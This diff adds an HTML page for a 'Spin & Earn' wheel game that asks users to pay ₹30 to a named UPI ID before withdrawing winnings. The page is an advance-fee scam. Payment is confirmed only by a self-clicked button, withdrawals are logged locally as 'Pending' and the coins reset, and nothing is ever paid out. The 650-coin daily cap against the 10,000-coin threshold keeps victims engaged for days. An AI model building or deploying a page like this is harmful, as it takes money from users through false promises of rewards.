@@ -1,0 +1,211 @@
+<!DOCTYPE html>
+<html lang="en">
+<head>
+<meta charset="UTF-8">
+<meta name="viewport" content="width=device-width, initial-scale=1.0">
+<title>Spin & Earn Demo</title>
+<link rel="stylesheet" href="https://cdnjs.cloudflare.com/ajax/libs/font-awesome/6.4.0/css/all.min.css">
+<style>
+* { box-sizing: border-box; margin: 0; padding: 0; }
+body { font-family: 'Segoe UI', Tahoma, Geneva, Verdana, sans-serif; background: linear-gradient(135deg, #6a11cb 0%, #2575fc 100%); text-align:center; padding:20px; min-height:100vh; color:#333; }
+.container { max-width: 1000px; margin:0 auto; }
+header { background:white; border-radius:15px; padding:20px; margin-bottom:25px; box-shadow:0 10px 30px rgba(0,0,0,0.15); }
+h1 { color:#2575fc; font-size:2.5rem; margin-bottom:10px; }
+.tagline { color:#6a11cb; font-size:1.2rem; margin-bottom:15px; }
+.content { display:flex; flex-wrap:wrap; gap:25px; justify-content:center; }
+.card { background:white; padding:25px; border-radius:15px; box-shadow:0 10px 30px rgba(0,0,0,0.15); flex:1; min-width:300px; }
+.payment-card { background: linear-gradient(135deg, #ff9a9e 0%, #fad0c4 100%); border:2px dashed #ff5252; }
+.stats-card { display:flex; justify-content:space-around; margin-bottom:20px; }
+.stat { text-align:center; padding:15px; border-radius:10px; background:#f8f9fa; flex:1; margin:0 10px; }
+.stat-value { font-size:2rem; font-weight:bold; color:#2575fc; }
+.wheel-container { position: relative; width: 300px; height: 300px; margin:0 auto 25px; }
+.wheel { width:100%; height:100%; border-radius:50%; position:relative; overflow:hidden; border:10px solid #fff; box-shadow:0 0 25px rgba(0,0,0,0.2); transition: transform 4s cubic-bezier(0.17,0.67,0.83,0.67); }
+.wheel-item { position:absolute; width:50%; height:50%; top:0; left:50%; transform-origin:left bottom; display:flex; align-items:center; justify-content:flex-start; font-weight:bold; font-size:1.2rem; color:white; padding-left:10px; }
+.wheel-pointer { position:absolute; top:-25px; left:50%; transform:translateX(-50%); width:30px; height:50px; background:#ff5252; clip-path:polygon(50% 100%, 0 0, 100% 0); z-index:10; filter:drop-shadow(0 5px 5px rgba(0,0,0,0.3)); }
+.btn { background: linear-gradient(to right,#6a11cb,#2575fc); color:white; padding:12px 25px; border:none; border-radius:50px; cursor:pointer; font-size:1.1rem; font-weight:bold; margin:10px 5px; transition:all 0.3s ease; box-shadow:0 5px 15px rgba(37,117,252,0.4); }
+.btn:hover { transform:translateY(-3px); box-shadow:0 8px 20px rgba(37,117,252,0.6); }
+.btn:active { transform:translateY(1px); }
+.btn:disabled { background:#cccccc; cursor:not-allowed; transform:none; box-shadow:none; }
+.btn-spin { background: linear-gradient(to right,#FF416C,#FF4B2B); box-shadow:0 5px 15px rgba(255,65,108,0.4); }
+.btn-spin:hover { box-shadow:0 8px 20px rgba(255,65,108,0.6); }
+.btn-payment { background: linear-gradient(to right,#00b09b,#96c93d); box-shadow:0 5px 15px rgba(0,176,155,0.4); }
+.btn-payment:hover { box-shadow:0 8px 20px rgba(0,176,155,0.6); }
+table { width:100%; border-collapse:collapse; margin-top:15px; }
+table, th, td { border:1px solid #ddd; }
+th, td { padding:12px; text-align:left; }
+th { background:#f8f9fa; font-weight:600; }
+tr:nth-child(even) { background:#f8f9fa; }
+#spinResult { font-size:1.2rem; font-weight:bold; margin:15px 0; min-height:30px; color:#2575fc; }
+.highlight { color:#FF416C; font-weight:bold; }
+.payment-upi { font-size:1.4rem; color:#2575fc; background:white; padding:10px; border-radius:10px; margin:15px 0; display:inline-block; font-weight:bold; }
+.contact { margin-top:30px; color:white; font-size:1rem; }
+.contact a { color:white; text-decoration:none; }
+.contact a:hover { text-decoration:underline; }
+.limit-info { background:#fff9e6; padding:10px; border-radius:8px; margin:15px 0; font-size:0.9rem; }
+.instructions { text-align:left; background:#f8f9fa; padding:15px; border-radius:10px; margin:15px 0; font-size:0.9rem; }
+.instructions ol { padding-left:20px; margin:10px 0; }
+.instructions li { margin-bottom:8px; }
+@media(max-width:768px){ .content{flex-direction:column;} .wheel-container{width:250px;height:250px;} input{width:100%;} }
+</style>
+</head>
+<body>
+<div class="container">
+<header>
+  <h1><i class="fas fa-gift"></i> Spin & Earn</h1>
+  <p class="tagline">Spin the wheel and win amazing rewards!</p>
+</header>
+
+<div class="content">
+  <!-- Spin Card -->
+  <div class="card">
+    <div class="stats-card">
+      <div class="stat"><div class="stat-value" id="coins">0</div><div>Total Coins</div></div>
+      <div class="stat"><div class="stat-value" id="spinsLeft">10</div><div>Spins Left</div></div>
+    </div>
+    <div class="wheel-container">
+      <div class="wheel" id="wheel"></div>
+      <div class="wheel-pointer"></div>
+    </div>
+    <button class="btn btn-spin" id="spinBtn">Spin Now</button>
+    <p id="spinResult"></p>
+    <div class="limit-info"><i class="fas fa-info-circle"></i> Daily limit: <span class="highlight">650 coins</span></div>
+  </div>
+
+  <!-- Add Fund Card -->
+  <div class="card payment-card">
+    <h3><i class="fas fa-wallet"></i> Add Funds</h3>
+    <p>Required before withdrawal</p>
+    <p>Minimum Add Fund = <span class="highlight">₹30</span></p>
+    <div class="payment-upi"><i class="fas fa-qrcode"></i> UPI ID: <span class="highlight">92bhai@slc</span></div>
+    <div class="instructions">
+      <p><strong>Payment Instructions:</strong></p>
+      <ol>
+        <li>Open your UPI app (Google Pay, PhonePe, Paytm, etc.)</li>
+        <li>Select "Send Money" or "Pay to UPI ID"</li>
+        <li>Enter UPI ID: <strong>92bhai@slc</strong></li>
+        <li>Enter amount: ₹30 or more</li>
+        <li>Complete the payment</li>
+        <li>Click the button below to confirm</li>
+      </ol>
+    </div>
+    <button class="btn btn-payment" onclick="addFund()">I Have Paid ₹30</button>
+    <p id="fundStatus">Fund Added: ❌</p>
+
+    <!-- UPI Transaction Notice -->
+    <div class="instructions" id="upiNotice">
+      <p><strong>Important Notice:</strong></p>
+      <ol>
+        <li>यदि आपने फंड ऐड किया है तो आपको अपनी UPI Transaction ID हमें देनी होगी।</li>
+        <li>यदि ID सही होगी तो आपका पैसा सफलतापूर्वक निकाला जाएगा।</li>
+      </ol>
+      <input type="text" id="upiIdInput" placeholder="Enter your UPI Transaction ID" style="padding:8px; width:80%; margin-bottom:10px; border-radius:5px; border:1px solid #ccc;">
+      <button class="btn btn-payment" onclick="submitUPI()">Submit UPI ID</button>
+      <p id="upiStatus">UPI ID Status: ❌</p>
+    </div>
+  </div>
+
+  <!-- Withdrawal Card -->
+  <div class="card">
+    <h3><i class="fas fa-rupee-sign"></i> Withdrawal</h3>
+    <p>Requirement: <span class="highlight">10000 Coins</span> + Fund Added + UPI ID</p>
+    <button class="btn" onclick="withdrawal()">Request Withdrawal</button>
+  </div>
+
+  <!-- Withdrawal History Card -->
+  <div class="card">
+    <h3><i class="fas fa-history"></i> Withdrawal History</h3>
+    <table>
+      <thead><tr><th>Date</th><th>Coins</th><th>Status</th></tr></thead>
+      <tbody id="history"></tbody>
+    </table>
+  </div>
+</div>
+
+<div class="contact">
+  <p>Contact us: <a href="mailto:m.aith.iend.i.9.5.5.11+0cw5bw@gmail.com">m.aith.iend.i.9.5.5.11+0cw5bw@gmail.com</a></p>
+  <p>© 2023 Spin & Earn. All rights reserved.</p>
+</div>
+</div>
+
+<script>
+// Init
+let coins = parseInt(localStorage.getItem('coins')) || 0;
+let spinsLeft = parseInt(localStorage.getItem('spinsLeft')) || 10;
+let lastSpinDate = localStorage.getItem('lastSpinDate') || '';
+let fundAdded = localStorage.getItem('fundAdded') === 'true';
+let todayCoins = parseInt(localStorage.getItem('todayCoins')) || 0;
+let history = JSON.parse(localStorage.getItem('history')) || [];
+let currentRotation = 0;
+let upiSubmitted = localStorage.getItem('upiTransactionId') ? true : false;
+
+const today = new Date().toDateString();
+if(today !== lastSpinDate){ spinsLeft = 10; todayCoins = 0; localStorage.setItem('lastSpinDate',today); localStorage.setItem('todayCoins','0'); }
+
+document.getElementById('coins').innerText=coins;
+document.getElementById('spinsLeft').innerText=spinsLeft;
+document.getElementById('fundStatus').innerText='Fund Added: '+(fundAdded?'✅':'❌');
+if(upiSubmitted) document.getElementById('upiStatus').innerText="UPI ID Status: ✅ Submitted";
+
+// Render history
+function renderHistory(){ document.getElementById('history').innerHTML = history.map(h=>`<tr><td>${h.date}</td><td>${h.coins}</td><td>${h.status}</td></tr>`).join(''); }
+renderHistory();
+
+// Wheel
+const spinValues=[0,10,50,100,500,1000];
+const colors=['#FF6384','#36A2EB','#FFCE56','#4BC0C0','#9966FF','#FF9F40'];
+const wheel=document.getElementById('wheel');
+const segmentAngle=360/spinValues.length;
+spinValues.forEach((v,i)=>{ const s=document.createElement('div'); s.className='wheel-item'; s.style.transform=`rotate(${i*segmentAngle}deg)`; s.style.backgroundColor=colors[i]; s.innerHTML=`<div style="transform: rotate(${segmentAngle/2}deg)">${v}</div>`; wheel.appendChild(s); });
+
+// Spin
+document.getElementById('spinBtn').addEventListener('click',()=>{
+  if(spinsLeft<=0){ alert("No spins left for today!"); return; }
+  document.getElementById('spinBtn').disabled=true;
+
+  const idx=Math.floor(Math.random()*spinValues.length);
+  let earned=spinValues[idx];
+  if(todayCoins+earned>650){ earned=Math.max(0,650-todayCoins); if(earned===0){ alert("Daily limit reached!"); document.getElementById('spinBtn').disabled=false; return; } }
+
+  const fullRotations=5;
+  const targetAngle=360-(idx*segmentAngle)+(segmentAngle/2);
+  const totalRotation=currentRotation+(fullRotations*360)+targetAngle;
+  currentRotation=totalRotation%360;
+  wheel.style.transition='transform 4s cubic-bezier(0.17,0.67,0.83,0.67)';
+  wheel.style.transform=`rotate(${totalRotation}deg)`;
+
+  setTimeout(()=>{
+    coins+=earned; todayCoins+=earned; spinsLeft--;
+    localStorage.setItem('coins',coins); localStorage.setItem('spinsLeft',spinsLeft); localStorage.setItem('todayCoins',todayCoins);
+    document.getElementById('coins').innerText=coins;
+    document.getElementById('spinsLeft').innerText=spinsLeft;
+    document.getElementById('spinResult').innerHTML=`<i class="fas fa-trophy"></i> Congratulations! You earned <span class="highlight">${earned} coins</span>!`;
+    document.getElementById('spinBtn').disabled=false;
+  },4000);
+});
+
+// Add fund
+function addFund(){ fundAdded=true; localStorage.setItem('fundAdded',true); document.getElementById('fundStatus').innerText='Fund Added: ✅'; alert("₹30 fund confirmed. Submit your UPI Transaction ID."); }
+
+// Submit UPI
+function submitUPI(){
+  const id=document.getElementById('upiIdInput').value.trim();
+  if(!fundAdded){ alert("Add fund first."); return; }
+  if(id===""){ alert("Enter valid UPI Transaction ID."); return; }
+  localStorage.setItem('upiTransactionId',id);
+  document.getElementById('upiStatus').innerText="UPI ID Status: ✅ Submitted"; upiSubmitted=true;
+  alert("UPI Transaction ID received. Withdrawal will be processed after verification.");
+}
+
+// Withdrawal
+function withdrawal(){
+  if(coins<10000){ alert("Need 10000 coins."); return; }
+  if(!fundAdded){ alert("Add ₹30 fund first."); return; }
+  if(!upiSubmitted){ alert("Submit UPI Transaction ID first."); return; }
+
+  let entry={date:new Date().toLocaleString(), coins:coins, status:'Pending'};
+  history.push(entry); localStorage.setItem('history',JSON.stringify(history)); renderHistory();
+  alert("Withdrawal submitted. Status: Pending"); coins=0; localStorage.setItem('coins','0'); document.getElementById('coins').innerText='0';
+}
+</script>
+</body>
+</html>
